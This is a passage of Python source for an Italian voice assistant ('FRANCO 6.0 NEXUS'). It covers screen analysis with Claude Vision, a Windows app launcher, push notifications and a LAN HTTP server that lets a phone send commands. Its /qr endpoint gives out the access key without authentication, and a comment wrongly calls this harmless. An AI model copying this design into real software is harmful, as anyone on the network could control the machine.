                pyautogui.keyUp(key)
            except Exception:
                pass
            return str(e)

    def type_text(self, text: str) -> Optional[str]:
        if not self.input_available():
            return "pyautogui non disponibile"
        try:
            pyautogui.typewrite(str(text), interval=0.02)
            return None
        except Exception as e:
            return str(e)

    def save_screenshot(self, name: str = None,
                       region: Tuple[int, int, int, int] = None) -> Optional[str]:
        """Save screenshot to file"""
        if name is None:
            name = f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        if not name.endswith(".png"):
            name += ".png"
        
        path = SCREENSHOTS_DIR / name
        
        try:
            png_bytes, err = self.capture_screenshot(region)
            if err:
                return None
            with open(path, "wb") as f:
                f.write(png_bytes)
            return str(path)
        except Exception as e:
            self.logger.error("VISION", f"Save error: {e}")
            return None
    
    def analyze_screen(self, question: str = None) -> str:
        """Analyze screen content with Claude Vision"""
        if not self.ai_client.is_available():
            return "AI non disponibile per visione."
        
        b64, err = self.capture_base64()
        if err:
            return f"Errore cattura: {err}"
        
        if question is None:
            question = "Cosa vedi sullo schermo? Descrivi in italiano."
        
        system = ("Sei FRANCO, assistente AI. Analizza l'immagine dello schermo. "
                 "Rispondi in italiano, conciso, max 3-4 frasi.")
        
        return self.ai_client.chat_with_image(question, b64, system=system, max_tokens=800)
    
    def find_element(self, what: str) -> Tuple[Optional[Dict], Optional[str]]:
        """Find element on screen using AI"""
        if not self.ai_client.is_available():
            return None, "AI non disponibile"
        
        b64, err = self.capture_base64()
        if err:
            return None, err
        
        prompt = (f'Trova "{what}" sullo schermo. Rispondi SOLO con JSON valido:\n'
                  f'{{"trovato": true, "x": 500, "y": 300, "descrizione": "..."}}\n'
                  f'oppure {{"trovato": false}}')
        
        try:
            response = self.ai_client.chat_with_image(
                prompt, b64,
                system="Sei un sistema di computer vision. Rispondi solo JSON.",
                max_tokens=200
            )
            
            # Estrai JSON
            json_match = re.search(r"\{.*\}", response, re.DOTALL)
            if json_match:
                data = json.loads(json_match.group())
                return data, None
            return None, "JSON non valido nella risposta"
        except Exception as e:
            return None, str(e)
    
    def read_screen_text(self) -> str:
        """Extract visible text from screen"""
        return self.analyze_screen(
            "Elenca TUTTO il testo visibile sullo schermo, in ordine dall'alto in basso. "
            "Riporta solo il testo, senza descrizioni."
        )
    
    def compare_screens(self, screenshot1_path: str, screenshot2_path: str) -> str:
        """Compare two screenshots"""
        if not self.ai_client.is_available():
            return "AI non disponibile"
        
        try:
            with open(screenshot1_path, "rb") as f:
                b1 = base64.b64encode(f.read()).decode()
            with open(screenshot2_path, "rb") as f:
                b2 = base64.b64encode(f.read()).decode()
            
            # Analizza entrambi gli screenshot per confronto reale
            return self.ai_client.chat_with_image(
                "Confronta queste due immagini. Cosa è cambiato?",
                b2,
                additional_images=[b1],
                system="Sei un sistema di computer vision.",
                max_tokens=500
            )
        except Exception as e:
            return f"Errore: {e}"


print("[✓] AI, NLP, TTS, Voice Recognition, Vision loaded")
# ==============================================================================
# F.R.A.N.C.O. 6.0 — NEXUS EDITION
# PARTE 7/7: COMMAND ENGINE, AUTOMATION, EMAIL, WEB, UI PYGAME, MAIN LOOP
# ==============================================================================

# NOTE: Questo file presuppone che le Parti 1-6 siano già caricate.
# Dipendenze dirette già importate nei moduli precedenti.

# ==============================================================================
# APP LAUNCHER — Discovery e avvio affidabile applicazioni Windows
# ==============================================================================

try:
    import winreg as _winreg
    HAS_WINREG = True
except ImportError:
    HAS_WINREG = False

try:
    import pythoncom as _pythoncom
    from win32com.client import Dispatch as _Dispatch
    HAS_WIN32COM = True
except Exception:
    HAS_WIN32COM = False


class AppLauncher:
    """Gestore avvio applicazioni Windows con discovery automatico e cache."""

    def __init__(self, config: dict, cache_file: Path, logger: 'StructuredLogger'):
        self.config = config.get("apps", {})
        self.cache_file = cache_file
        self.logger = logger
        self.index: Dict[str, str] = {}
        self.aliases: Dict[str, str] = {}
        self.last_scan = 0
        self.ttl = int(self.config.get("cache_ttl_hours", 24)) * 3600
        self._load_cache()
        self._load_aliases()

    @staticmethod
    def _normalize(name: str) -> str:
        s = name.lower().strip()
        s = re.sub(r"\.(exe|lnk)$", "", s)
        s = re.sub(r"[^a-z0-9]+", " ", s)
        return re.sub(r"\s+", " ", s).strip()

    def _load_cache(self):
        if not self.cache_file.exists():
            return
        try:
            data = json.loads(self.cache_file.read_text(encoding="utf-8"))
            self.index = data.get("index", {})
            self.last_scan = data.get("last_scan", 0)
            self.logger.info("APP", f"Cache caricata: {len(self.index)} app")
        except Exception as e:
            self.logger.warning("APP", f"Cache corrotta: {e}")

    def _save_cache(self):
        try:
            self.cache_file.write_text(
                json.dumps({"index": self.index, "last_scan": self.last_scan},
                           indent=2, ensure_ascii=False),
                encoding="utf-8"
            )
        except Exception as e:
            self.logger.error("APP", f"Save cache: {e}")

    def _load_aliases(self):
        for canonical, alias_list in (self.config.get("custom_aliases") or {}).items():
            cn = self._normalize(canonical)
            for alias in alias_list:
                self.aliases[self._normalize(alias)] = cn

        for name, path in (self.config.get("manual_paths") or {}).items():
            expanded = os.path.expandvars(path)
            if Path(expanded).exists():
                self.index[self._normalize(name)] = expanded
                self.logger.info("APP", f"Manuale: {name} -> {expanded}")

    def _resolve_lnk(self, lnk_path: str) -> Optional[str]:
        if not HAS_WIN32COM:
            return None
        try:
            _pythoncom.CoInitialize()
            shell = _Dispatch("WScript.Shell")
            sc = shell.CreateShortcut(lnk_path)
            return sc.TargetPath
        except Exception:
            return None
        finally:
            try:
                _pythoncom.CoUninitialize()
            except Exception as _e:
                pass  # suppressed error

    def _scan_start_menu(self) -> List[Tuple[str, str]]:
        results = []
        roots = [
            os.path.expandvars(r"%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs"),
            os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs"),
        ]
        for root in roots:
            p = Path(root)
            if not p.exists():
                continue
            for lnk in p.rglob("*.lnk"):
                target = self._resolve_lnk(str(lnk))
                if target and Path(target).exists() and target.lower().endswith(".exe"):
                    results.append((lnk.stem, target))
        return results

    @staticmethod
    def _reg_get(key, name: str) -> Optional[str]:
        try:
            v, _ = _winreg.QueryValueEx(key, name)
            return v if isinstance(v, str) and v else None
        except Exception:
            return None

    @staticmethod
    def _find_main_exe(folder: str, name_hint: str = "") -> Optional[str]:
        p = Path(folder)
        if not p.exists():
            return None
        hint = re.sub(r"[^a-z0-9]", "", name_hint.lower())
        candidates = list(p.rglob("*.exe"))
        if hint:
            for exe in candidates:
                if hint in re.sub(r"[^a-z0-9]", "", exe.stem.lower()):
                    return str(exe)
        for exe in candidates:
            sn = exe.stem.lower()
            if "unins" not in sn and "setup" not in sn and "update" not in sn:
                return str(exe)
        return None

    def _scan_registry(self) -> List[Tuple[str, str]]:
        if not HAS_WINREG:
            return []
        results = []
        hives = [
            (_winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
            (_winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
            (_winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
        ]
        for hive, base in hives:
            try:
                with _winreg.OpenKey(hive, base) as root:
                    for i in range(20000):
                        try:
                            sub = _winreg.EnumKey(root, i)
                        except OSError:
                            break
                        try:
                            with _winreg.OpenKey(root, sub) as k:
                                name = self._reg_get(k, "DisplayName")
                                icon = self._reg_get(k, "DisplayIcon")
                                inst = self._reg_get(k, "InstallLocation")
                                exe = None
                                if icon:
                                    cand = icon.split(",")[0].strip().strip('"')
                                    if cand.lower().endswith(".exe") and Path(cand).exists():
                                        exe = cand
                                if not exe and inst and Path(inst).exists():
                                    exe = self._find_main_exe(inst, name or "")
                                if name and exe:
                                    results.append((name, exe))
                        except OSError:
                            continue
            except OSError:
                continue
        return results

    def _scan_directories(self) -> List[Tuple[str, str]]:
        results = []
        for path in (self.config.get("scan_paths") or []):
            expanded = os.path.expandvars(path)
            p = Path(expanded)
            if not p.exists():
                continue
            try:
                for exe in p.glob("*/*.exe"):
                    results.append((exe.stem, str(exe)))
                for exe in p.glob("*/*/*.exe"):
                    sn = exe.stem.lower()
                    if "unins" not in sn and "setup" not in sn:
                        results.append((exe.stem, str(exe)))
            except (PermissionError, OSError):
                continue
        return results

    def refresh(self, force: bool = False) -> int:
        now = time.time()
        if not force and self.index and (now - self.last_scan) < self.ttl:
            return len(self.index)

        self.logger.info("APP", "Discovery applicazioni in corso...")
        found = []
        found.extend(self._scan_start_menu())
        found.extend(self._scan_registry())
        found.extend(self._scan_directories())

        manual_norms = {self._normalize(n)
                        for n in (self.config.get("manual_paths") or {}).keys()}
        new_index = {k: v for k, v in self.index.items() if k in manual_norms}

        for name, path in found:
            norm = self._normalize(name)
            if norm and norm not in new_index:
                new_index[norm] = path

        self.index = new_index
        self.last_scan = now
        self._save_cache()
        self.logger.success("APP", f"Discovery: {len(self.index)} app indicizzate")
        return len(self.index)

    def find(self, query: str) -> Optional[Tuple[str, str]]:
        if not self.index:
            self.refresh(force=True)
        q = self._normalize(query)
        if not q:
            return None

        if q in self.index:
            return q, self.index[q]

        if q in self.aliases:
            cn = self.aliases[q]
            if cn in self.index:
                return cn, self.index[cn]

        candidates = []
        for key, path in self.index.items():
            if q in key or key in q:
                candidates.append((key, path, len(key)))
        if candidates:
            candidates.sort(key=lambda x: x[2])
            return candidates[0][0], candidates[0][1]

        best = None
        best_ratio = 0.7
        for key, path in self.index.items():
            ratio = difflib.SequenceMatcher(None, q, key).ratio()
            if ratio > best_ratio:
                best_ratio = ratio
                best = (key, path)
        return best

    def suggest(self, query: str, n: int = 5) -> List[str]:
        q = self._normalize(query)
        scored = []
        for key in self.index.keys():
            ratio = difflib.SequenceMatcher(None, q, key).ratio()
            if ratio > 0.4:
                scored.append((key, ratio))
        scored.sort(key=lambda x: x[1], reverse=True)
        return [k for k, _ in scored[:n]]

    def launch(self, query: str) -> Tuple[bool, str]:
        result = self.find(query)
        if not result:
            suggestions = self.suggest(query, 3)
            sugg = f" Forse intendevi: {', '.join(suggestions)}." if suggestions else ""
            return False, f"App '{query}' non trovata.{sugg}"

        name, path = result
        try:
            os.startfile(path)
            return True, f"Avvio {name}"
        except Exception:
            try:
                subprocess.Popen([path], stdout=subprocess.DEVNULL,
                                 stderr=subprocess.DEVNULL, shell=False)
                return True, f"Avvio {name}"
            except Exception as e:
                return False, f"Errore avvio {name}: {e}"

    def register_manual(self, name: str, exe_path: str) -> bool:
        p = Path(os.path.expandvars(exe_path))
        if not p.exists() or not p.is_file():
            return False
        self.index[self._normalize(name)] = str(p)
        self._save_cache()
        self.logger.success("APP", f"Registrato: {name} -> {p}")
        return True

    def list_all(self) -> Dict[str, str]:
        return dict(self.index)
    
    # ==============================================================================
# EARTHQUAKE MONITOR — Allerta sismica INGV/EMSC + push telefono
# ==============================================================================

def _haversine_km(lat1, lon1, lat2, lon2) -> float:
    R = 6371.0
    p1, p2 = math.radians(lat1), math.radians(lat2)
    dphi = math.radians(lat2 - lat1)
    dlam = math.radians(lon2 - lon1)
    a = math.sin(dphi/2)**2 + math.cos(p1)*math.cos(p2)*math.sin(dlam/2)**2
    return 2 * R * math.asin(math.sqrt(a))


class PushNotifier:
    """Notifiche push tramite NTFY e/o Telegram."""

    def __init__(self, config: dict, logger: 'StructuredLogger'):
        self.cfg = config or {}
        self.logger = logger

    def send(self, title: str, message: str, priority: str = "default",
             tags: Optional[List[str]] = None, click_url: Optional[str] = None) -> bool:
        ok = False
        ntfy = self.cfg.get("ntfy") or {}
        if ntfy.get("enabled"):
            try:
                self._send_ntfy(ntfy, title, message, priority, tags or [], click_url)
                ok = True
            except Exception as e:
                self.logger.warning("PUSH", f"NTFY fail: {e}")

        tg = self.cfg.get("telegram") or {}
        if tg.get("enabled"):
            try:
                self._send_telegram(tg, title, message)
                ok = True
            except Exception as e:
                self.logger.warning("PUSH", f"Telegram fail: {e}")
        return ok

    def _send_ntfy(self, cfg, title, message, priority, tags, click_url=None):
        topic = cfg.get("topic", "").strip()
        if not topic:
            raise ValueError("NTFY topic mancante")
        server = cfg.get("server", "https://ntfy.sh").rstrip("/")
        url = f"{server}/{urllib.parse.quote(topic)}"
        prio_map = {"low": "2", "default": "3", "high": "4", "max": "5"}
        req = urllib.request.Request(url, data=message.encode("utf-8"), method="POST")
        req.add_header("Title", title.encode("utf-8").decode("latin-1", "ignore"))
        req.add_header("Priority", prio_map.get(priority, "3"))
        if tags:
            req.add_header("Tags", ",".join(tags))
        if click_url:
            req.add_header("Click", click_url)
        with urllib.request.urlopen(req, timeout=10) as r:
            r.read()

    def _send_telegram(self, cfg, title, message):
        token = cfg.get("bot_token", "").strip()
        chat_id = str(cfg.get("chat_id", "")).strip()
        if not token or not chat_id:
            raise ValueError("Telegram non configurato")
        text = f"*{title}*\n{message}"
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        data = json.dumps({"chat_id": chat_id, "text": text,
                           "parse_mode": "Markdown"}).encode("utf-8")
        req = urllib.request.Request(url, data=data, method="POST")
        req.add_header("Content-Type", "application/json")
        with urllib.request.urlopen(req, timeout=10) as r:
            r.read()


class EarthquakeMonitor:
    """Monitor terremoti in tempo reale (INGV/EMSC)."""


# ==============================================================================
# MOBILE BRIDGE — Server HTTP per controllo FRANCO da telefono
# ==============================================================================
#
#  Come funziona:
#   1. FRANCO avvia un HTTP server sulla LAN (porta 8765)
#   2. Il telefono apre http://<ip-pc>:8765 nel browser
#   3. L'app web usa Web Speech API per ascoltare la voce dell'utente
#   4. I comandi vengono inviati a FRANCO via POST /cmd
#   5. Le risposte di FRANCO vengono lette ad alta voce dal browser (TTS)
#   6. Aggiornamenti real-time via Server-Sent Events (GET /events)
#   7. Push ntfy.sh come canale di backup per notifiche importanti
#
# ==============================================================================

from http.server import BaseHTTPRequestHandler, HTTPServer, ThreadingHTTPServer


# ── HTML MOBILE APP ─────────────────────────────────────────────────────────

_MOBILE_HTML = """<!DOCTYPE html>
<html lang="it">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<title>FRANCO 6.0 NEXUS</title>
<style>
  :root{--primary:#00c8ff;--accent:#00ffc8;--bg:#02060e;--panel:#08121f;
    --border:#005080;--text:#dce8ff;--dim:#506070;--danger:#ff3c3c;--warn:#ffb400;--ok:#00ff64}
  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
  body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;
    height:100dvh;display:flex;flex-direction:column;overflow:hidden;user-select:none}

  /* Header */
  #hdr{background:var(--panel);border-bottom:1px solid var(--border);
    padding:10px 16px;display:flex;align-items:center;justify-content:space-between;flex-shrink:0}
  #hdr h1{font-size:15px;font-weight:700;color:var(--primary);letter-spacing:2px}
  #status-badge{padding:3px 10px;border-radius:20px;font-size:11px;font-weight:600;
    border:1px solid currentColor;transition:all .3s}

  /* Transcript */
  #transcript{flex:1;overflow-y:auto;padding:12px;display:flex;flex-direction:column;gap:8px;
    scroll-behavior:smooth}
  .msg{padding:10px 13px;border-radius:10px;font-size:14px;line-height:1.45;max-width:90%;
    animation:fadein .25s ease}
  @keyframes fadein{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
  .msg.franco{background:#003050;border-left:3px solid var(--accent);align-self:flex-start;color:var(--accent)}
  .msg.user{background:#001830;border-right:3px solid var(--primary);align-self:flex-end;color:var(--text)}
  .msg .ts{font-size:10px;color:var(--dim);margin-top:4px}
  .msg.system{background:#0a0a0a;color:var(--dim);font-size:12px;align-self:center;
    border:1px solid var(--border);border-radius:6px;padding:5px 10px}

  /* Controls */
  #controls{background:var(--panel);border-top:1px solid var(--border);
    padding:10px 12px;flex-shrink:0}
  #input-row{display:flex;gap:8px;margin-bottom:8px}
  #cmd-input{flex:1;background:#0a1828;border:1px solid var(--border);border-radius:8px;
    color:var(--text);font-size:14px;padding:10px 12px;outline:none;
    -webkit-appearance:none;caret-color:var(--primary)}
  #cmd-input:focus{border-color:var(--primary)}
  #send-btn{background:var(--primary);color:#000;border:none;border-radius:8px;
    padding:10px 16px;font-weight:700;font-size:14px;cursor:pointer;white-space:nowrap}
  #send-btn:active{opacity:.8}

  #btn-row{display:flex;gap:8px}
  #voice-btn{flex:1;padding:13px;border-radius:10px;border:2px solid var(--primary);
    background:transparent;color:var(--primary);font-size:15px;font-weight:700;
    cursor:pointer;transition:all .2s;display:flex;align-items:center;justify-content:center;gap:8px}
  #voice-btn.listening{background:var(--primary);color:#000;border-color:var(--primary)}
  #voice-btn.listening .mic-icon{animation:pulse 1s infinite}
  @keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.15)}}
  #voice-btn:disabled{opacity:.4;cursor:not-allowed}

  #tts-btn{padding:13px 16px;border-radius:10px;border:1px solid var(--border);
    background:var(--panel);color:var(--text);font-size:13px;cursor:pointer}
  #tts-btn.active{border-color:var(--accent);color:var(--accent)}

  /* Metrics bar */
  #metrics{display:flex;gap:12px;font-size:11px;color:var(--dim);
    padding:6px 0 0;justify-content:center}
  .metric span{color:var(--text)}

  /* Indicators */
  #indicators{display:flex;gap:6px;align-items:center}
  .dot{width:7px;height:7px;border-radius:50%;background:var(--dim)}
  .dot.on{background:var(--ok)}
  .dot.warn{background:var(--warn)}
  .dot.err{background:var(--danger)}
</style>
</head>
<body>
<div id="hdr">
  <h1>&#9670; F.R.A.N.C.O.</h1>
  <div id="indicators">
    <div class="dot" id="dot-conn" title="Connessione"></div>
    <div class="dot" id="dot-tts" title="TTS attivo"></div>
    <div class="dot" id="dot-voice" title="Voce"></div>
  </div>
  <div id="status-badge" style="color:var(--dim);border-color:var(--dim)">IDLE</div>
</div>

<div id="transcript"><div class="msg system">Connessione a FRANCO in corso...</div></div>

<div id="controls">
  <div id="input-row">
    <input id="cmd-input" type="text" placeholder="Scrivi un comando..." autocomplete="off"
           autocorrect="off" autocapitalize="off" spellcheck="false">
    <button id="send-btn" onclick="sendText()">INVIA</button>
  </div>
  <div id="btn-row">
    <button id="voice-btn" onclick="toggleVoice()" disabled>
      <span class="mic-icon">&#127908;</span>
      <span id="voice-label">PARLA</span>
    </button>
    <button id="tts-btn" onclick="toggleTTS()" title="Abilita/disabilita TTS">
      &#128266; TTS
    </button>
  </div>
  <div id="metrics">
    <div class="metric">CPU <span id="m-cpu">--</span>%</div>
    <div class="metric">RAM <span id="m-ram">--</span>%</div>
    <div class="metric">DISK <span id="m-disk">--</span>%</div>
    <div class="metric" id="m-batt-wrap" style="display:none">BATT <span id="m-batt">--</span>%</div>
  </div>
</div>

<script>
const $ = id => document.getElementById(id);
const transcript = $('transcript');
const input = $('cmd-input');
const badge = $('status-badge');

// Chiave d'accesso: letta dall'URL (?key=...) al primo accesso via QR code,
// poi salvata cosi' i refresh successivi restano autenticati senza il QR.
const urlKey = new URLSearchParams(window.location.search).get('key');
if (urlKey) { localStorage.setItem('franco_key', urlKey); }
const AUTH_KEY = urlKey || localStorage.getItem('franco_key') || '';
function authUrl(path) {
  const sep = path.includes('?') ? '&' : '?';
  return AUTH_KEY ? `${path}${sep}key=${encodeURIComponent(AUTH_KEY)}` : path;
}

let ttsEnabled = true;
let recognition = null;
let isListening = false;
let evtSource = null;
let msgCount = 0;

const STATUS_COLORS = {
  IDLE: '#506070', LISTENING: '#00c8ff', THINKING: '#ffb400',
  SPEAKING: '#00ff64', STANDBY: '#003050', ERROR: '#ff3c3c'
};

// ── SSE connection ──────────────────────────────────────────────────
function connectSSE() {
  if(evtSource) evtSource.close();
  evtSource = new EventSource(authUrl('/events'));

  evtSource.addEventListener('status', e => {
    const d = JSON.parse(e.data);
    updateStatus(d.state || 'IDLE');
    if(d.cpu !== undefined) $('m-cpu').textContent = Math.round(d.cpu);
    if(d.ram !== undefined) $('m-ram').textContent = Math.round(d.ram);
    if(d.disk !== undefined) $('m-disk').textContent = Math.round(d.disk);
    if(d.battery !== undefined) {
      $('m-batt').textContent = Math.round(d.battery);
      $('m-batt-wrap').style.display = '';
    }
    $('dot-conn').className = 'dot on';
  });

  evtSource.addEventListener('message', e => {
    const d = JSON.parse(e.data);
    addMsg('franco', d.text, d.ts);
    if(ttsEnabled && d.text) speakTTS(d.text);
  });

  evtSource.addEventListener('transcript', e => {
    const msgs = JSON.parse(e.data);
    transcript.innerHTML = '';
    msgCount = 0;
    msgs.forEach(m => addMsg(m.role === 'FRANCO' ? 'franco' : 'user', m.text, m.ts));
  });

  evtSource.onerror = () => {
    $('dot-conn').className = 'dot err';
    updateStatus('OFFLINE');
    setTimeout(connectSSE, 3000);
  };
}

// ── UI helpers ──────────────────────────────────────────────────────
function updateStatus(state) {
  badge.textContent = state;
  const col = STATUS_COLORS[state] || '#506070';
  badge.style.color = col;
  badge.style.borderColor = col;
}

function addMsg(role, text, ts) {
  if(!text) return;
  const div = document.createElement('div');
  div.className = 'msg ' + role;
  const tsStr = ts || new Date().toLocaleTimeString('it', {hour:'2-digit', minute:'2-digit'});
  div.innerHTML = '<div>' + escHtml(text) + '</div><div class="ts">' +
    (role === 'franco' ? '&#9654; FRANCO' : '&#9664; Tu') + '  ' + tsStr + '</div>';
  transcript.appendChild(div);
  msgCount++;
  if(msgCount > 100) transcript.firstChild.remove();
  transcript.scrollTop = transcript.scrollHeight;
}

function addSystem(text) {
  const div = document.createElement('div');
  div.className = 'msg system';
  div.textContent = text;
  transcript.appendChild(div);
  transcript.scrollTop = transcript.scrollHeight;
}

function escHtml(t) {
  return t.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

// ── Send command ─────────────────────────────────────────────────────
function sendText() {
  const text = input.value.trim();
  if(!text) return;
  addMsg('user', text);
  input.value = '';
  fetch(authUrl('/cmd'), {method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({command: text})})
    .catch(() => addSystem('Errore invio comando'));
}

input.addEventListener('keydown', e => { if(e.key === 'Enter') sendText(); });

// ── Web Speech API ───────────────────────────────────────────────────
function initVoice() {
  const SpeechRec = window.SpeechRecognition || window.webkitSpeechRecognition;
  if(!SpeechRec) { addSystem('Riconoscimento vocale non supportato su questo browser.'); return; }
  recognition = new SpeechRec();
  recognition.lang = 'it-IT';
  recognition.continuous = false;
  recognition.interimResults = false;

  recognition.onresult = e => {
    const text = e.results[0][0].transcript.trim();
    if(text) { addMsg('user', text); sendCommand(text); }
  };
  recognition.onstart = () => {
    isListening = true;
    $('voice-btn').className = 'listening';
    $('voice-label').textContent = 'ASCOLTANDO...';
    $('dot-voice').className = 'dot on';
  };
  recognition.onend = () => {
    isListening = false;
    $('voice-btn').className = '';
    $('voice-label').textContent = 'PARLA';
    $('dot-voice').className = 'dot';
  };
  recognition.onerror = e => {
    isListening = false;
    $('voice-btn').className = '';
    $('voice-label').textContent = 'PARLA';
    $('dot-voice').className = 'dot err';
    if(e.error !== 'no-speech') addSystem('Errore voce: ' + e.error);
  };
  $('voice-btn').disabled = false;
}

function toggleVoice() {
  if(!recognition) return;
  if(isListening) { recognition.stop(); return; }
  recognition.start();
}

function sendCommand(text) {
  fetch(authUrl('/cmd'), {method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({command: text})}).catch(() => {});
}

// ── Browser TTS ──────────────────────────────────────────────────────
const synth = window.speechSynthesis;
let ttsVoice = null;

function loadVoices() {
  const voices = synth.getVoices();
  ttsVoice = voices.find(v => v.lang.startsWith('it')) ||
             voices.find(v => v.lang.startsWith('en')) || null;
}
if(synth) { loadVoices(); if(speechSynthesis.onvoiceschanged !== undefined) synth.onvoiceschanged = loadVoices; }

function speakTTS(text) {
  if(!synth || !ttsEnabled) return;
  synth.cancel();
  const utt = new SpeechSynthesisUtterance(text);
  utt.lang = 'it-IT';
  utt.rate = 1.05;
  utt.pitch = 0.95;
  if(ttsVoice) utt.voice = ttsVoice;
  $('dot-tts').className = 'dot on';
  utt.onend = () => { $('dot-tts').className = 'dot'; };
  synth.speak(utt);
}

function toggleTTS() {
  ttsEnabled = !ttsEnabled;
  $('tts-btn').className = ttsEnabled ? 'active' : '';
  $('tts-btn').style.color = ttsEnabled ? 'var(--accent)' : '';
  if(!ttsEnabled) { synth.cancel(); $('dot-tts').className = 'dot'; }
  addSystem('TTS ' + (ttsEnabled ? 'attivato' : 'disattivato'));
}

// ── Keyboard shortcut (spacebar = toggle voice) ───────────────────────
document.addEventListener('keydown', e => {
  if(e.target === input) return;
  if(e.code === 'Space') { e.preventDefault(); toggleVoice(); }
});

// ── Boot ─────────────────────────────────────────────────────────────
window.addEventListener('load', () => {
  initVoice();
  connectSSE();
  // Load history
  fetch(authUrl('/transcript')).then(r => r.json()).then(data => {
    transcript.innerHTML = '';
    msgCount = 0;
    (data.messages || []).forEach(m => addMsg(m.role === 'FRANCO' ? 'franco' : 'user', m.text, m.ts));
    addSystem('Connesso a FRANCO. Premi PARLA o Spazio per parlare.');
  }).catch(() => addSystem('Connesso. In attesa di comandi.'));
});
</script>
</body>
</html>"""


class MobileBridge:
    """
    Server HTTP per controllo completo di FRANCO dal telefono.

    Architettura:
      GET  /           → Web App mobile (HTML+JS, Jarvis-style)
      GET  /events     → Server-Sent Events (stato, transcript real-time)
      GET  /status     → JSON stato sistema
      GET  /transcript → JSON ultimi N messaggi
      POST /cmd        → Invia comando testuale a FRANCO
      GET  /qr         → QR code URL per accesso rapido dal telefono

    Push backup:
      ntfy.sh topic FRANCO_MOBILE — notifiche push quando FRANCO parla
    """

    def __init__(self,
                 config: dict,
                 command_queue: "queue.Queue",
                 state: "StateManager",
                 memory: "MemoryManager",
                 transcript_buffer: "deque",
                 logger: "StructuredLogger",
                 push_notifier: "PushNotifier",
                 event_bus: "EventBus"):
        self.cfg       = config.get("mobile", {})
        self.cmd_q     = command_queue
        self.state     = state
        self.memory    = memory
        self.transcript = transcript_buffer
        self.logger    = logger
        self.notifier  = push_notifier
        self.event_bus = event_bus

        self._host     = self.cfg.get("host", "0.0.0.0")
        self._port     = int(self.cfg.get("port", 8765))
        self._api_keys = self._resolve_api_keys()

        self._running  = False
        self._server: Optional[HTTPServer] = None
        self._thread: Optional[threading.Thread] = None

        # SSE clients: list of threading.Event + queue pairs
        self._sse_clients: List[queue.Queue] = []
        self._sse_lock = threading.Lock()

        # Subscribe to FRANCO events → push to SSE clients
        self.event_bus.subscribe("command.processed", self._on_command_processed)
        self.event_bus.subscribe("proactive.alert",   self._on_proactive_alert)

    # ------------------------------------------------------------------ #
    #  AUTENTICAZIONE
    # ------------------------------------------------------------------ #

    def _resolve_api_keys(self) -> set:
        """Chiave API per il Mobile Bridge: MAI hardcoded. Priorita':
        1) FRANCO_MOBILE_API_KEY dall'ambiente, 2) chiavi in config,
        3) genera una chiave sicura random e la salva localmente (persiste
        tra i riavvii senza mai finire nel codice sorgente)."""
        env_key = os.environ.get("FRANCO_MOBILE_API_KEY", "")
        keys = set(self.cfg.get("api_keys", []))
        if env_key:
            keys.add(env_key)
        if keys:
            return keys
        key_file = DATA_DIR / ".mobile_api_key"
        try:
            if key_file.is_file():
                saved = key_file.read_text(encoding="utf-8").strip()
                if saved:
                    return {saved}
            new_key = secrets.token_urlsafe(24)
            key_file.write_text(new_key, encoding="utf-8")
            try:
                os.chmod(key_file, 0o600)
            except Exception:
                pass
            self.logger.warning(
                "MOBILE",
                f"Nessuna API key configurata: generata automaticamente e salvata "
                f"in {key_file}. Usa quella per accedere dal telefono (via QR code)."
            )
            return {new_key}
        except Exception as e:
            self.logger.error("MOBILE", f"Impossibile generare/salvare API key: {e}")
            # Fallback: chiave solo in memoria, cambia ad ogni riavvio (mai vuota)
            return {secrets.token_urlsafe(24)}

    def _check_auth(self, handler) -> bool:
        """Verifica la API key da header Authorization: Bearer o ?key=."""
        auth_header = handler.headers.get("Authorization", "")
        if auth_header.startswith("Bearer "):
            token = auth_header[7:].strip()
            if token in self._api_keys:
                return True
        query = urllib.parse.urlparse(handler.path).query
        params = urllib.parse.parse_qs(query)
        token = (params.get("key") or [""])[0]
        return token in self._api_keys

    # ------------------------------------------------------------------ #
    #  START / STOP
    # ------------------------------------------------------------------ #

    def start(self):
        if self._running or not self.cfg.get("enabled", True):
            return
        self._running = True
        self._thread = threading.Thread(target=self._serve, daemon=True, name="MobileBridge")
        self._thread.start()

        # Periodic state pusher (every 5 seconds)
        threading.Thread(target=self._state_pusher, daemon=True, name="MobileStatePush").start()

        local_ip = get_local_ip()
        url = f"http://{local_ip}:{self._port}"
        self.logger.success("MOBILE", f"Mobile Bridge attivo → {url}")
        return url

    def stop(self):
        self._running = False
        if self._server:
            try:
                self._server.shutdown()
            except Exception as _e:
                pass  # suppressed error

    def _serve(self):
        bridge = self
        class Handler(BaseHTTPRequestHandler):
            def log_message(self, fmt, *args):
                pass  # silenzioso
            def do_GET(self):
                self._route_get(bridge)
            def do_POST(self):
                self._route_post(bridge)
            def do_OPTIONS(self):
                self.send_response(200)
                self._cors()
                self.end_headers()

            def _cors(self):
                self.send_header("Access-Control-Allow-Origin", "*")
                self.send_header("Access-Control-Allow-Methods", "GET,POST,OPTIONS")
                self.send_header("Access-Control-Allow-Headers", "Content-Type,Authorization")

            def _route_get(self, b: "MobileBridge"):
                path = self.path.split("?")[0]
                if path == "/qr":
                    # /qr genera il codice per il PRIMO accesso: non richiede
                    # auth (serve proprio a distribuire la chiave), ma non
                    # rivela nulla di sensibile oltre all'URL con la chiave.
                    self._serve_qr(b)
                    return
                if not b._check_auth(self):
                    self.send_error(401, "Unauthorized")
                    return
                if path == "/":
                    self._serve_html(_MOBILE_HTML)
                elif path == "/events":
                    self._serve_sse(b)
                elif path == "/status":
                    self._serve_json(b._get_status())
